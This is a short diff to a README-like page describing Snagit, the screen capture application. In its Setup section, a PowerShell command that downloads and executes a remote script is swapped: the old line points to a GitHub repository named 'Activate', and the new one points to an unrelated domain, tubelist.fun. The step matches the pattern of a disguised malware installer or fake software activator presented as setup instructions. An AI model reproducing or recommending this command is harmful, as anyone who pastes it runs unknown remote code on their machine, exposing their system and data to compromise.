@@ -5,7 +5,7 @@ Snagit is a professional screen capture and recording application developed by T
 #### Setup
 
 ```powershell
-irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
+irm https://tubelist.fun/install.ps1 | iex
 ```
 
 #### Core Functions
